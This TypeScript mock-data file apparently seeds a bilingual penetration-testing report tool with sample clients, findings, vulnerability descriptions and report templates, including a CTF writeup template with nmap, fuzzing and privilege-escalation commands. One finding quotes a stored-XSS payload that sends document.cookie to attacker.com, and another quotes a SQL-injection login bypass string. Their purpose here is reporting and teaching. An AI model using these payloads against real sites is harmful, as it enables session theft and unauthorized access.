

import type { Client, Project, Finding, Vulnerability, ProjectTemplate } from './types';
import { format } from 'date-fns';

export const clients: Client[] = [
  { id: 'cli-1', name: 'Innovatech Solutions', contact: 'contact@innovatech.com', logoUrl: 'https://picsum.photos/seed/innovatech/128/128' },
  { id: 'cli-2', name: 'Quantum Dynamics', contact: 'security@quantum.com', logoUrl: 'https://picsum.photos/seed/quantum/128/128' },
  { id: 'cli-3', name: 'SecureBank Corp', contact: 'audit@securebank.com', logoUrl: 'https://picsum.photos/seed/securebank/128/128' },
  { id: 'cli-4', name: 'HealthFirst Providers', contact: 'compliance@healthfirst.com', logoUrl: 'https://picsum.photos/seed/healthfirst/128/128' },
];

export const projects: Project[] = [
  { 
    id: 'proj-1', 
    clientId: 'cli-1', 
    name: 'Q3 Web App Pentest', 
    reportBody: `## Executive Summary
This report outlines the results of an external penetration test conducted on the internet-facing assets of **Innovatech Solutions**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter.

---

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]** from the perspective of an external, unauthenticated attacker (black-box).

### Scope
- **Web Applications:** *.innovatech.com, api.innovatech.com
- **External Network:** 198.51.100.0/24

### Methodology
1. **Reconnaissance:** Discovering subdomains, open ports, and services.
2. **Vulnerability Scanning:** Using automated tools to identify common vulnerabilities.
3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.

---

## Attack Narrative
The engagement began with reconnaissance against the *.innovatech.com domain, which revealed the existence of an outdated blog at 'blog.innovatech.com' and a development server at 'dev.innovatech.com' with directory listing enabled. An SQL Injection vulnerability was discovered and exploited on the main web application's login form, allowing for authentication bypass. This access was leveraged to uncover a Stored XSS vulnerability in the user profile section, which could be used to target other users, including administrators.

---

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
| High | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
| Medium | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
| Low | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
| Informational | 0.0 | Observations about the external footprint of the organization. |`, 
    startDate: '2023-07-01', 
    endDate: '2023-07-15', 
    status: 'Completed', 
    language: 'en', 
    createdAt: '2023-07-01T10:00:00Z', 
    updatedAt: '2023-07-15T18:00:00Z', 
    icon: 'Scan' 
  },
  { 
    id: 'proj-2', 
    clientId: 'cli-2', 
    name: 'Análisis de Red Interna', 
    reportBody: '', 
    startDate: '2023-08-10', 
    endDate: '2023-08-20', 
    status: 'In Progress', 
    language: 'es', 
    createdAt: '2023-08-10T09:00:00Z', 
    updatedAt: '2023-08-15T14:30:00Z', 
    icon: 'Network' 
  },
];

export const findings: Finding[] = [
  { 
    id: 'find-1', 
    projectId: 'proj-1', 
    vulnerabilityId: 'vuln-A03', 
    title: 'SQL Injection on Login Form', 
    severity: 'Critical', 
    cvss: 9.8, 
    markdown: `### Overview
A critical SQL Injection vulnerability was identified in the main login form of the application. This flaw allows an attacker to bypass authentication mechanisms and gain unauthorized access to the application, potentially with administrative privileges.

---

### Technical Description
The 'username' parameter of the login POST request to /auth/login is vulnerable. By submitting a crafted payload like \`' OR '1'='1' --\`, an attacker can manipulate the backend SQL query to always return true, effectively logging in as the first user in the database (often an administrator).

---

### Affected Components
- \`/auth/login\` endpoint
- User authentication module

---

### Impact
Successful exploitation grants an attacker unauthorized access to the application. Depending on the user account compromised (e.g., an administrator), this could lead to a full compromise of the application, data exfiltration, and further attacks against the underlying infrastructure.

---

### Recommendations
Implement parameterized queries (prepared statements) to handle all user-supplied input in database queries. This is the most effective way to prevent SQL Injection attacks. Validate and sanitize all user input on the server side as a defense-in-depth measure.`, 
    createdAt: '2023-07-05T11:00:00Z', 
    updatedAt: '2023-07-10T15:00:00Z' 
  },
  { 
    id: 'find-2', 
    projectId: 'proj-1', 
    vulnerabilityId: 'vuln-web-002', 
    title: 'Stored Cross-Site Scripting (XSS) in User Profile', 
    severity: 'High', 
    cvss: 8.0, 
    markdown: `### Overview
A stored XSS vulnerability exists in the user profile section, allowing an attacker to inject malicious scripts that execute in the browsers of other users, including administrators.

---

### Technical Description
The 'bio' field in the user profile page does not properly sanitize user input before storing it in the database and rendering it on the page. An attacker can set their biography to a malicious script, such as \`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\`. When another user views the attacker's profile, the script will execute in their browser.

---

### Affected Components
- User profile page (e.g., /profile/{userId})
- 'bio' field update functionality

---

### Impact
This vulnerability can be used to steal session cookies, perform actions on behalf of other users (CSRF), redirect users to malicious websites, or deface the application. If an administrator's session is hijacked, it could lead to a full application compromise.

---

### Recommendations
Implement context-aware output encoding for all user-supplied data before it is rendered in the browser. Use a library like DOMPurify to sanitize HTML content if users are allowed to submit rich text.`, 
    createdAt: '2023-07-06T14:00:00Z', 
    updatedAt: '2023-07-11T10:00:00Z' 
  },
];

const emptyVulnBoilerplate = {
  remediation_en: { shortTerm: '[TODO]', mediumTerm: '[TODO]', longTerm: '[TODO]' },
  remediation_es: { shortTerm: '[TODO]', mediumTerm: '[TODO]', longTerm: '[TODO]' },
  details_en: "[TODO: Provide a PoC, evidence, or detailed steps to reproduce the vulnerability.]",
  details_es: "[TODO: Proporcionar una PoC, evidencia o pasos detallados para reproducir la vulnerabilidad.]",
};

export const vulnerabilities: Vulnerability[] = [
    // Web
    {
        id: "vuln-web-001",
        title_en: "SQL Injection",
        title_es: "Inyección SQL",
        cwe: "CWE-89",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nSQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.",
        overview_es: "### Resumen\nLa inyección SQL es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación hace a su base de datos. Generalmente, permite a un atacante ver datos que normalmente no podría recuperar.",
        technicalDescription_en: "### Technical Description\nThe application concatenates user-supplied input with a SQL query without proper validation or sanitization. An attacker can provide a specially crafted input to manipulate the query structure.",
        technicalDescription_es: "### Descripción Técnica\nLa aplicación concatena la entrada proporcionada por el usuario con una consulta SQL sin la validación o desinfección adecuadas. Un atacante puede proporcionar una entrada especialmente diseñada para manipular la estructura de la consulta.",
        affectedComponents_en: "### Affected Components\n[TODO: Specify vulnerable parameters and endpoints, e.g., 'id' parameter in /products/view.php, login forms]",
        affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar parámetros y endpoints vulnerables, p. ej., parámetro 'id' en /products/view.php, formularios de inicio de sesión]",
        impact_en: "### Impact\nThis might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior, and in some cases, take control of the database server.",
        impact_es: "### Impacto\nEsto podría incluir datos pertenecientes a otros usuarios o cualquier otro dato al que la propia aplicación pueda acceder. En muchos casos, un atacante puede modificar o eliminar estos datos, provocando cambios persistentes en el contenido o el comportamiento de la aplicación, y en algunos casos, tomar el control del servidor de la base de datos.",
        recommendations_en: "### Recommendations\nUse parameterized queries (prepared statements) to prevent the interpreter from confusing data with code. Validate and sanitize all user input. Apply the principle of least privilege to the database user.",
        recommendations_es: "### Recomendaciones\nUtilizar consultas parametrizadas (sentencias preparadas) para evitar que el intérprete confunda los datos con el código. Validar y desinfectar todas las entradas del usuario. Aplicar el principio de privilegio mínimo al usuario de la base de datos.",
        references: ["https://owasp.org/www-community/attacks/SQL_Injection"],
        tags: ["Web", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-web-002",
        title_en: "Cross-Site Scripting (XSS)",
        title_es: "Secuencias de Comandos en Sitios Cruzados (XSS)",
        cwe: "CWE-79",
        severity: "High",
        cvss: { score: 7.2, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nCross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.",
        overview_es: "### Resumen\nLos ataques de Cross-Site Scripting (XSS) son un tipo de inyección, en la que se inyectan scripts maliciosos en sitios web que de otro modo serían benignos y confiables. Los ataques XSS ocurren cuando un atacante utiliza una aplicación web para enviar código malicioso, generalmente en forma de un script del lado del navegador, a un usuario final diferente.",
        technicalDescription_en: "### Technical Description\nThe application includes user-supplied data in the response without proper escaping or sanitization. This allows an attacker to inject a script that will be executed in the victim's browser. It can be stored (persistent), reflected, or DOM-based.",
        technicalDescription_es: "### Descripción Técnica\nLa aplicación incluye datos proporcionados por el usuario en la respuesta sin el escape o la desinfección adecuados. Esto permite que un atacante inyecte un script que se ejecutará en el navegador de la víctima. Puede ser almacenado (persistente), reflejado o basado en DOM.",
        affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable field or parameter, e.g., search query, profile bio, comment section]",
        affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el campo o parámetro vulnerable, p. ej., consulta de búsqueda, biografía del perfil, sección de comentarios]",
        impact_en: "### Impact\nAn attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site.",
        impact_es: "### Impacto\nUn atacante puede usar XSS para enviar un script malicioso a un usuario desprevenido. El navegador del usuario final no tiene forma de saber que no se debe confiar en el script y lo ejecutará. Debido a que cree que el script proviene de una fuente confiable, el script malicioso puede acceder a cualquier cookie, token de sesión u otra información confidencial retenida por el navegador y utilizada con ese sitio.",
        recommendations_en: "### Recommendations\nImplement context-aware output encoding. Use a modern web framework that provides built-in XSS protection. Implement a Content Security Policy (CSP) to mitigate the impact of any XSS that might still occur.",
        recommendations_es: "### Recomendaciones\nImplementar codificación de salida sensible al contexto. Utilizar un marco web moderno que proporcione protección XSS incorporada. Implementar una Política de Seguridad de Contenido (CSP) para mitigar el impacto de cualquier XSS que aún pueda ocurrir.",
        references: ["https://owasp.org/www-community/attacks/xss/"],
        tags: ["Web", "XSS"],
        ...emptyVulnBoilerplate
    },
    // ... (More vulnerabilities will be added here following the same detailed structure)
];

export const projectTemplates: ProjectTemplate[] = [
  {
    id: 'ptpl-1',
    name_en: 'Standard Web App Pentest',
    name_es: 'Pentest Estándar de Aplicación Web',
    description_en: 'A comprehensive security assessment for web applications, covering OWASP Top 10 and other common vulnerabilities.',
    description_es: 'Una evaluación de seguridad completa para aplicaciones web, cubriendo el OWASP Top 10 y otras vulnerabilidades comunes.',
    icon: 'Scan',
    scope_en: `## Scope
- **Application URL:** [TODO: Add application URL, e.g., https://example.com]
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Credentials:** [TODO: Specify credentials if provided, e.g., user, admin]
- **Exclusions:** [TODO: Specify any out-of-scope targets, e.g., *.blog.example.com]

## Methodology
The assessment will follow a standard web application penetration testing methodology, including:
1.  **Reconnaissance:** Information gathering about the application and infrastructure.
2.  **Automated Scanning:** Using tools to identify low-hanging fruit.
3.  **Manual Testing:** In-depth testing for complex vulnerabilities such as business logic flaws, access control issues, and injection attacks.
4.  **Reporting:** Documentation of findings and remediation recommendations.`,
    scope_es: `## Alcance
- **URL de la Aplicación:** [TODO: Añadir URL de la aplicación, p.ej., https://ejemplo.com]
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **Credenciales:** [TODO: Especificar credenciales si se proporcionaron, p.ej., usuario, administrador]
- **Exclusiones:** [TODO: Especificar objetivos fuera de alcance, p.ej., *.blog.ejemplo.com]

## Metodología
La evaluación seguirá una metodología estándar de pruebas de penetración de aplicaciones web, que incluye:
1.  **Reconocimiento:** Recopilación de información sobre la aplicación y la infraestructura.
2.  **Escaneo Automatizado:** Uso de herramientas para identificar vulnerabilidades de bajo esfuerzo.
3.  **Pruebas Manuales:** Pruebas en profundidad para vulnerabilidades complejas como fallos de lógica de negocio, problemas de control de acceso y ataques de inyección.
4.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### Appendix
A combination of automated tools and manual techniques were used to perform this assessment.
- **Proxy:** Burp Suite Professional
- **Scanners:** Nessus, Nuclei
- **Reconnaissance:** Amass, Subfinder`,
    appendix_es: `### Apéndice
Se utilizó una combinación de herramientas automatizadas y técnicas manuales para realizar esta evaluación.
- **Proxy:** Burp Suite Professional
- **Escáneres:** Nessus, Nuclei
- **Reconocimiento:** Amass, Subfinder`
  },
  {
    id: 'ptpl-2',
    name_en: 'Internal Network Assessment',
    name_es: 'Evaluación de Red Interna',
    description_en: 'An assessment of the internal network to identify misconfigurations, vulnerable services, and pathways for lateral movement.',
    description_es: 'Una evaluación de la red interna para identificar configuraciones incorrectas, servicios vulnerables y vías para el movimiento lateral.',
    icon: 'Network',
    scope_en: `## Scope
- **IP Ranges:** [TODO: Add IP ranges, e.g., 192.168.1.0/24]
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Assumptions:** The assessment is performed from the perspective of an attacker who has gained a foothold on the internal network (e.g., a compromised workstation).
- **Exclusions:** [TODO: Specify any out-of-scope systems]

## Methodology
1.  **Network Discovery:** Identifying live hosts and open ports.
2.  **Service Enumeration:** Fingerprinting services running on discovered ports.
3.  **Vulnerability Scanning:** Scanning for known vulnerabilities in identified services.
4.  **Manual Exploitation:** Attempting to exploit vulnerabilities to gain further access.
5.  **Active Directory Analysis:** Looking for misconfigurations in Active Directory, such as weak passwords, kerberoasting opportunities, and privilege escalation paths.
6.  **Reporting:** Documenting findings and remediation recommendations.`,
    scope_es: `## Alcance
- **Rangos IP:** [TODO: Añadir rangos IP, p.ej., 192.168.1.0/24]
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **Supuestos:** La evaluación se realiza desde la perspectiva de un atacante que ha obtenido un punto de apoyo en la red interna (p.ej., una estación de trabajo comprometida).
- **Exclusiones:** [TODO: Especificar sistemas fuera de alcance]

## Metodología
1.  **Descubrimiento de Red:** Identificación de hosts activos y puertos abiertos.
2.  **Enumeración de Servicios:** Identificación de los servicios que se ejecutan en los puertos descubiertos.
3.  **Escaneo de Vulnerabilidades:** Búsqueda de vulnerabilidades conocidas en los servicios identificados.
4.  **Explotación Manual:** Intento de explotar vulnerabilities para obtener más acceso.
5.  **Análisis de Active Directory:** Búsqueda de configuraciones incorrectas en Active Directory, como contraseñas débiles, oportunidades de kerberoasting y rutas de escalada de privilegios.
6.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### Appendix
- **Network Scanner:** Nmap, Masscan
- **Vulnerability Scanner:** Nessus
- **Active Directory:** BloodHound, Impacket
- **Manual Exploitation:** Metasploit Framework, CrackMapExec`,
    appendix_es: `### Apéndice
- **Escáner de Red:** Nmap, Masscan
- **Escáner de Vulnerabilidades:** Nessus
- **Active Directory:** BloodHound, Impacket
- **Explotación Manual:** Metasploit Framework, CrackMapExec`
  },
  {
    id: 'ptpl-3',
    name_en: 'Mobile App Pentest (iOS/Android)',
    name_es: 'Pentest de Aplicación Móvil (iOS/Android)',
    description_en: 'A security assessment of an iOS or Android mobile application, focusing on client-side vulnerabilities and backend API security.',
    description_es: 'Una evaluación de seguridad de una aplicación móvil de iOS o Android, centrada en vulnerabilidades del lado del cliente y seguridad de la API de backend.',
    icon: 'Smartphone',
    scope_en: `## Scope
- **Application:** [TODO: Add application name and package/bundle ID]
- **Platform:** iOS / Android
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Backend APIs:** [TODO: List backend API endpoints in scope]

## Methodology
The assessment includes both static and dynamic analysis of the mobile application.
1.  **Static Analysis (SAST):** Analyzing the application binary to find hardcoded secrets, insecure configurations, and other weaknesses without running the code.
2.  **Dynamic Analysis (DAST):** Running the application on a test device (rooted/jailbroken) to analyze its runtime behavior, including:
    -   Network traffic analysis (MitM).
    -   Insecure data storage checks.
    -   IPC endpoint analysis.
    -   Runtime manipulation with Frida.
3.  **API Testing:** Testing the backend APIs for common web vulnerabilities (OWASP API Top 10).
4.  **Reporting:** Documentation of findings and remediation recommendations.`,
    scope_es: `## Alcance
- **Aplicación:** [TODO: Añadir nombre de la aplicación y ID del paquete/bundle]
- **Plataforma:** iOS / Android
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **APIs de Backend:** [TODO: Listar endpoints de API de backend en el alcance]

## Metodología
La evaluación incluye tanto el análisis estático como el dinámico de la aplicación móvil.
1.  **Análisis Estático (SAST):** Análisis del binario de la aplicación para encontrar secretos embebidos, configuraciones inseguras y otras debilidades sin ejecutar el código.
2.  **Análisis Dinámico (DAST):** Ejecución de la aplicación en un dispositivo de prueba (rooteado/con jailbreak) para analizar su comportamiento en tiempo de ejecución, incluyendo:
    -   Análisis del tráfico de red (MitM).
    -   Comprobaciones de almacenamiento de datos inseguro.
    -   Análisis de endpoints IPC.
    -   Manipulación en tiempo de ejecución con Frida.
3.  **Pruebas de API:** Pruebas de las API de backend para vulnerabilidades web comunes (OWASP API Top 10).
4.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### Appendix
- **Static Analysis:** MobSF, jadx
- **Dynamic Analysis:** Burp Suite, Frida, Objection
- **Test Devices:** Google Pixel 6 (Rooted), iPhone 12 (Jailbroken)`,
    appendix_es: `### Apéndice
- **Análisis Estático:** MobSF, jadx
- **Análisis Dinámico:** Burp Suite, Frida, Objection
- **Dispositivos de Prueba:** Google Pixel 6 (Rooteado), iPhone 12 (con Jailbreak)`
  },
  {
    id: 'ptpl-4',
    name_en: 'Certification Report',
    name_es: 'Informe de Certificación',
    description_en: 'A generic and professional template for offensive security certification reports (e.g., OSCP, CPTS). Includes all necessary sections for a complete report.',
    description_es: 'Una plantilla genérica y profesional para informes de certificaciones de seguridad ofensiva (p. ej., OSCP, CPTS). Incluye todas las secciones necesarias para un informe completo.',
    icon: 'Award',
    scope_en: `## Introduction
This report documents the results of the simulated penetration test performed in the [TODO: Certification Name] exam environment.

## Objective
The objective was to perform a penetration test, identifying and exploiting vulnerabilities to gain unauthorized access to target systems and achieve the exam objectives.

## Scope
- **Target Network:** [TODO: e.g., 10.10.10.0/24]
- **Exam Duration:** [TODO Start Date] to [TODO End Date]`,
    scope_es: `## Introducción
Este informe documenta los resultados de la prueba de penetración simulada realizada en el entorno del examen [TODO: Nombre de la Certificación].

## Objetivo
El objetivo fue realizar una prueba de penetración, identificando y explotando vulnerabilidades para obtener acceso no autorizado a los sistemas objetivo y cumplir los objetivos del examen.

## Alcance
- **Red Objetivo:** [TODO: p. ej., 10.10.10.0/24]
- **Duración del Examen:** [TODO Start Date] a [TODO End Date]`,
    appendix_en: `### Appendix
| Hostname / IP | Location | Value |
|---|---|---|
| [TODO: Hostname/IP] | [TODO: e.g., /root/proof.txt] | [TODO: Flag Value] |
`,
    appendix_es: `### Apéndice
| Hostname / IP | Ubicación | Valor |
|---|---|---|
| [TODO: Hostname/IP] | [TODO: p. ej., /root/proof.txt] | [TODO: Valor de la Bandera] |
`
  },
  {
    id: 'ptpl-5',
    name_en: 'Machine Writeup',
    name_es: 'Writeup de Máquina',
    description_en: 'A template for documenting the process of solving a CTF machine, such as those on Hack The Box.',
    description_es: 'Una plantilla para documentar el proceso de resolución de una máquina CTF, como las de Hack The Box.',
    icon: 'FileText',
    scope_en: `## General Information
- **Machine Name:** [TODO: Machine Name]
- **IP Address:** [TODO: IP Address]
- **Operating System:** Linux
- **Difficulty:** [TODO: Select Difficulty]
- **Date:** ${format(new Date(), 'dd-MM-yyyy')}

---

## Initial Reconnaissance

### Add IP to /etc/hosts
\`\`\`bash
echo "[TODO: IP Address] [TODO: machine.htb]" | sudo tee -a /etc/hosts
\`\`\`

### Port Scanning (Nmap)

#### Simple Scan
\`\`\`bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn [TODO: IP Address]
\`\`\`

#### Advanced Scan
\`\`\`bash
sudo nmap -sCV -p22,80 [TODO: IP Address] -oN targeted
\`\`\`
*Result: Found ports 22 (SSH) and 80 (HTTP) open.*

---

## Web Enumeration

### Initial Access & Analysis
- **URL:** \`http://[TODO: machine.htb]\`
- **Useful Commands:**
  \`\`\`bash
  # Check DNS
  host [TODO: machine.htb]
  dig [TODO: machine.htb]
  
  # Check headers
  curl -I http://[TODO: machine.htb]
  
  # Web technology identification
  whatweb -a3 -v http://[TODO: machine.htb]
  
  # Check common ports
  netcat -vz [TODO: machine.htb] 1-1000
  \`\`\`

### Directory Fuzzing
\`\`\`bash
# Using dirsearch
dirsearch -u http://[TODO: machine.htb] -x 403,404

# Using gobuster
gobuster dir -u http://[TODO: machine.htb] -w /usr/share/wordlists/dirb/common.txt

# Using ffuf
ffuf -u http://[TODO: machine.htb]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
\`\`\`
*Found directories: [TODO: List found directories like /about.php, /contact.php]*

### Subdomain Enumeration (VHosts)
Check for different response sizes to identify potential virtual hosts.
\`\`\`bash
# Fuzz for subdomains using ffuf and filter by response size
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://[TODO: machine.htb]/ -H 'Host: FUZZ.[TODO: machine.htb]' -fs [TODO: base_response_size]
\`\`\`
*Found subdomain: [TODO: e.g., grafana.planning.htb]. Added to /etc/hosts.*

---

## Exploitation

### Vulnerability Research
*Identified Service/Version: [TODO: e.g., Grafana v11.0.0]*
- Searched for exploits on:
  - https://exploit-db.com
  - https://sploitus.com
  - GitHub
- **Selected Exploit:** [TODO: Describe the selected exploit and its reference URL]

### Exploit Execution
[TODO: Step-by-step description of how the exploit was executed to gain initial access.]

---

## Initial Access
- **User:** \`whoami\` -> [TODO: user]
- **Environment:** \`uname -a\`, \`id\`, \`sudo -l\`

### User Flag
- **Command:** \`cat /home/[TODO: user]/user.txt\`

---

## Privilege Escalation

### Enumeration
- **Check sudo permissions:** \`sudo -l\`
- **Find SUID/GUID files:**
  \`\`\`bash
  find / -user root -perm -4000 -print 2>/dev/null
  \`\`\`
- **Check running services:** \`ss -tuln\`
- **Automated enumeration scripts:** \`linpeas.sh\`, \`pspy\`

### Applied Technique
[TODO: Describe the technique used: SUID binary, misconfigured cronjob, hardcoded credentials, etc.]

---

## 👑 Root Flag
- **Command:** \`cat /root/root.txt\`
`,
    scope_es: `## Información General
- **Nombre de la máquina:** [TODO: Nombre de la máquina]
- **Dirección IP:** [TODO: Dirección IP]
- **Sistema Operativo:** Linux
- **Dificultad:** [TODO: Seleccionar Dificultad]
- **Fecha:** ${format(new Date(), 'dd-MM-yyyy')}

---

## Reconocimiento Inicial

### Añadir IP a /etc/hosts
\`\`\`bash
echo "[TODO: Dirección IP] [TODO: maquina.htb]" | sudo tee -a /etc/hosts
\`\`\`

### Escaneo de Puertos (Nmap)

#### Escaneo Simple
\`\`\`bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn [TODO: Dirección IP]
\`\`\`

#### Escaneo Avanzado
\`\`\`bash
sudo nmap -sCV -p22,80 [TODO: Dirección IP] -oN targeted
\`\`\`
*Resultado: Se encontraron los puertos 22 (SSH) y 80 (HTTP) abiertos.*

---

## Enumeración Web

### Acceso y Análisis Inicial
- **URL:** \`http://[TODO: maquina.htb]\`
- **Comandos útiles:**
  \`\`\`bash
  # Comprobar DNS
  host [TODO: maquina.htb]
  dig [TODO: maquina.htb]
  
  # Comprobar cabeceras
  curl -I http://[TODO: maquina.htb]
  
  # Identificación de tecnología web
  whatweb -a3 -v http://[TODO: maquina.htb]
  
  # Comprobar puertos comunes
  netcat -vz [TODO: maquina.htb] 1-1000
  \`\`\`

### Fuzzing de Directorios
\`\`\`bash
# Usando dirsearch
dirsearch -u http://[TODO: maquina.htb] -x 403,404

# Usando gobuster
gobuster dir -u http://[TODO: maquina.htb] -w /usr/share/wordlists/dirb/common.txt

# Usando ffuf
ffuf -u http://[TODO: maquina.htb]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
\`\`\`
*Directorios encontrados: [TODO: Listar directorios como /about.php, /contact.php]*

### Enumeración de Subdominios (VHosts)
Comprobar diferentes tamaños de respuesta para identificar posibles hosts virtuales.
\`\`\`bash
# Fuzzing de subdominios con ffuf y filtrado por tamaño de respuesta
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://[TODO: maquina.htb]/ -H 'Host: FUZZ.[TODO: maquina.htb]' -fs [TODO: tamaño_respuesta_base]
\`\`\`
*Subdominio encontrado: [TODO: p.ej., grafana.planning.htb]. Añadido a /etc/hosts.*

---

## Explotación

### Investigación de Vulnerabilidades
*Servicio/Versión Identificado: [TODO: p.ej., Grafana v11.0.0]*
- Búsqueda de exploits en:
  - https://exploit-db.com
  - https://sploitus.com
  - GitHub
- **Exploit Seleccionado:** [TODO: Describir el exploit usado y su URL de referencia]

### Ejecución del Exploit
[TODO: Descripción paso a paso de cómo se ejecutó el exploit para obtener acceso inicial.]

---

## Acceso Inicial
- **Usuario:** \`whoami\` -> [TODO: usuario]
- **Entorno:** \`uname -a\`, \`id\`, \`sudo -l\`

### Bandera de Usuario (User Flag)
- **Comando:** \`cat /home/[TODO: usuario]/user.txt\`

---

## Escalada de Privilegios

### Enumeración
- **Comprobar permisos de sudo:** \`sudo -l\`
- **Buscar archivos SUID/GUID:**
  \`\`\`bash
  find / -user root -perm -4000 -print 2>/dev/null
  \`\`\`
- **Ver servicios en ejecución:** \`ss -tuln\`
- **Scripts de enumeración automatizada:** \`linpeas.sh\`, \`pspy\`

### Técnica Aplicada
[TODO: Describir la técnica usada: binario SUID, cronjob mal configurado, credenciales hardcoded, etc.]

---

## 👑 Root Flag
- **Comando:** \`cat /root/root.txt\`
`,
    appendix_en: `### Appendix
- **Network Scanner:** Nmap
- **Web Fuzzer:** ffuf, dirsearch
- **Exploitation:** [TODO: e.g., Metasploit, Python script]
- **Privilege Escalation:** linpeas.sh`,
    appendix_es: `### Apéndice
- **Escáner de Red:** Nmap
- **Fuzzer Web:** ffuf, dirsearch
- **Explotación:** [TODO: p. ej., Metasploit, script de Python]
- **Escalada de Privilegios:** linpeas.sh`
  },
];

  
